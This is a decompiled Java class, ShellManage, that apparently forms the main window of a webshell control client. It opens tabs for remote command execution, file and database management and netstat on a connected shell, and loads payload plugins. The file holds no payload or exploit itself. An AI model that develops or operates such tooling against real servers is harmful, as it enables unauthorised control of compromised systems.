/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package core.ui;

import core.ApplicationContext;
import core.EasyI18N;
import core.annotation.DisplayName;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.MainActivity;
import core.ui.component.RTabbedPane;
import core.ui.component.ShellBasicsInfo;
import core.ui.component.ShellCopyTab;
import core.ui.component.ShellDatabasePanel;
import core.ui.component.ShellExecCommandPanel;
import core.ui.component.ShellFileManager;
import core.ui.component.ShellNetstat;
import core.ui.component.ShellNote;
import core.ui.component.dialog.GOptionPane;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedHashMap;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTabbedPane;
import util.Log;
import util.functions;

public class ShellManage
extends JFrame {
    private JTabbedPane tabbedPane;
    private ShellEntity shellEntity;
    private ShellExecCommandPanel shellExecCommandPanel;
    private ShellBasicsInfo shellBasicsInfo;
    private ShellFileManager shellFileManager;
    private ShellDatabasePanel shellDatabasePanel;
    private LinkedHashMap<String, Plugin> pluginMap = new LinkedHashMap();
    private LinkedHashMap<String, JPanel> globalComponent = new LinkedHashMap();
    private ArrayList<JPanel> allViews = new ArrayList();
    private Payload payload;
    private ShellCopyTab shellCopyTab;
    private JLabel loadLabel = new JLabel("loading......");
    private static final HashMap<String, String> CN_HASH_MAP = new HashMap();

    public ShellManage(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.tabbedPane = new RTabbedPane();
        String titleString = String.format("Url:%s Payload:%s Cryption:%s openCache:%s useCache:%s", this.shellEntity.getUrl(), this.shellEntity.getPayload(), this.shellEntity.getCryption(), shellEntity.isUseCache() ? false : ApplicationContext.isOpenCache(), shellEntity.isUseCache());
        this.setTitle(titleString);
        boolean state = this.shellEntity.initShellOpertion();
        if (state) {
            this.init();
        } else {
            this.setTitle("\u521d\u59cb\u5316\u5931\u8d25");
            GOptionPane.showMessageDialog(this, "\u521d\u59cb\u5316\u5931\u8d25", "\u63d0\u793a", 2);
            this.dispose();
        }
    }

    private void init() {
        this.shellEntity.setFrame(this);
        this.payload = this.shellEntity.getPayloadModule();
        this.add(this.loadLabel);
        functions.setWindowSize(this, 1690, 680);
        this.setLocationRelativeTo(MainActivity.getFrame());
        this.setVisible(true);
        this.setDefaultCloseOperation(2);
        this.initComponent();
    }

    private void initComponent() {
        this.remove(this.loadLabel);
        this.add(this.tabbedPane);
        this.loadGlobalComponent();
        if (!this.shellEntity.isUseCache()) {
            this.loadPlugins();
        }
        this.loadView();
        this.shellCopyTab.scan();
    }

    private void loadView() {
        this.allViews.addAll(this.globalComponent.values());
        for (String key : this.globalComponent.keySet()) {
            JPanel panel = this.globalComponent.get(key);
            EasyI18N.installObject(panel);
            String name = panel.getClass().getSimpleName();
            DisplayName displayName = panel.getClass().getAnnotation(DisplayName.class);
            if (displayName != null) {
                name = EasyI18N.getI18nString(displayName.DisplayName());
            }
            EasyI18N.installObject(panel);
            this.tabbedPane.addTab(name, this.globalComponent.get(key));
        }
        for (String key : this.pluginMap.keySet()) {
            Plugin plugin = this.pluginMap.get(key);
            JPanel panel = plugin.getView();
            PluginAnnotation pluginAnnotation = plugin.getClass().getAnnotation(PluginAnnotation.class);
            if (panel == null) continue;
            EasyI18N.installObject(plugin);
            EasyI18N.installObject(panel);
            this.tabbedPane.addTab(pluginAnnotation.Name(), panel);
            this.allViews.add(panel);
        }
    }

    public static String getCNName(String name) {
        for (String key : CN_HASH_MAP.keySet()) {
            if (!key.toUpperCase().equals(name.toUpperCase())) continue;
            return CN_HASH_MAP.get(key);
        }
        return name;
    }

    private void loadGlobalComponent() {
        this.shellCopyTab = new ShellCopyTab(this.shellEntity);
        this.shellBasicsInfo = new ShellBasicsInfo(this.shellEntity);
        this.globalComponent.put("BasicsInfo", this.shellBasicsInfo);
        this.shellExecCommandPanel = new ShellExecCommandPanel(this.shellEntity);
        this.globalComponent.put("ExecCommand", this.shellExecCommandPanel);
        this.shellFileManager = new ShellFileManager(this.shellEntity);
        this.globalComponent.put("FileManage", this.shellFileManager);
        this.shellDatabasePanel = new ShellDatabasePanel(this.shellEntity);
        this.globalComponent.put("DatabaseManage", this.shellDatabasePanel);
        this.globalComponent.put("Note", new ShellNote(this.shellEntity));
        this.globalComponent.put("Netstat", new ShellNetstat(this.shellEntity));
        this.globalComponent.put("CopyTab", this.shellCopyTab);
    }

    private String getPluginName(Plugin p) {
        PluginAnnotation pluginAnnotation = p.getClass().getAnnotation(PluginAnnotation.class);
        return pluginAnnotation.Name();
    }

    public Plugin createPlugin(String pluginName) {
        try {
            Plugin plugin = this.pluginMap.get(pluginName);
            if (plugin != null) {
                plugin = (Plugin)plugin.getClass().newInstance();
                plugin.init(this.shellEntity);
                plugin.getView();
                return plugin;
            }
        } catch (Exception e) {
            Log.error(e);
        }
        return null;
    }

    public ShellFileManager getShellFileManager() {
        return this.shellFileManager;
    }

    private void loadPlugins() {
        Plugin plugin;
        int i;
        Plugin[] plugins = ApplicationContext.getAllPlugin(this.shellEntity.getPayload());
        for (i = 0; i < plugins.length; ++i) {
            try {
                plugin = plugins[i];
                this.pluginMap.put(this.getPluginName(plugin), plugin);
                continue;
            } catch (Exception e) {
                Log.error(e);
            }
        }
        for (i = 0; i < plugins.length; ++i) {
            try {
                plugin = plugins[i];
                plugin.init(this.shellEntity);
                continue;
            } catch (Exception e) {
                Log.error(e);
            }
        }
    }

    public Plugin getPlugin(String pluginName) {
        return this.pluginMap.get(pluginName);
    }

    @Override
    public void dispose() {
        try {
            this.tabbedPane.disable();
            for (JPanel jPanel : this.allViews) {
                if (!jPanel.isEnabled()) continue;
                jPanel.disable();
            }
        } catch (Exception e) {
            Log.error(e);
        }
        this.close();
        if (this.payload != null && ApplicationContext.isOpenC("isAutoCloseShell")) {
            try {
                Log.log(String.format("CloseShellState: %s\tShellId: %s\tShellHash: %s", this.shellEntity.getPayloadModule().close(), this.shellEntity.getId(), this.shellEntity.hashCode()), new Object[0]);
            } catch (Exception e) {
                Log.error(e);
            }
        }
        super.dispose();
        System.gc();
    }

    public void close() {
        this.pluginMap.keySet().forEach(key -> {
            Plugin plugin = this.pluginMap.get(key);
            try {
                Method method = functions.getMethodByClass(plugin.getClass(), "closePlugin", null);
                if (method != null) {
                    method.invoke(plugin, null);
                }
            } catch (Exception e) {
                Log.error(e);
            }
        });
        this.globalComponent.keySet().forEach(key -> {
            JPanel plugin = this.globalComponent.get(key);
            try {
                Method method = functions.getMethodByClass(plugin.getClass(), "closePlugin", null);
                if (method != null) {
                    method.invoke(plugin, null);
                }
            } catch (Exception e) {
                Log.error(e);
            }
        });
        this.pluginMap.clear();
        this.globalComponent.clear();
    }

    public LinkedHashMap<String, Plugin> getPluginMap() {
        return this.pluginMap;
    }

    public LinkedHashMap<String, JPanel> getGlobalComponent() {
        return this.globalComponent;
    }

    public JTabbedPane getTabbedPane() {
        return this.tabbedPane;
    }

    static {
        CN_HASH_MAP.put("payload", "\u6709\u6548\u8f7d\u8377");
        CN_HASH_MAP.put("secretKey", "\u5bc6\u94a5");
        CN_HASH_MAP.put("password", "\u5bc6\u7801");
        CN_HASH_MAP.put("cryption", "\u52a0\u5bc6\u5668");
        CN_HASH_MAP.put("PROXYHOST", "\u4ee3\u7406\u4e3b\u673a");
        CN_HASH_MAP.put("PROXYPORT", "\u4ee3\u7406\u7aef\u53e3");
        CN_HASH_MAP.put("CONNTIMEOUT", "\u8fde\u63a5\u8d85\u65f6");
        CN_HASH_MAP.put("READTIMEOUT", "\u8bfb\u53d6\u8d85\u65f6");
        CN_HASH_MAP.put("PROXY", "\u4ee3\u7406\u7c7b\u578b");
        CN_HASH_MAP.put("REMARK", "\u5907\u6ce8");
        CN_HASH_MAP.put("ENCODING", "\u7f16\u7801");
    }
}

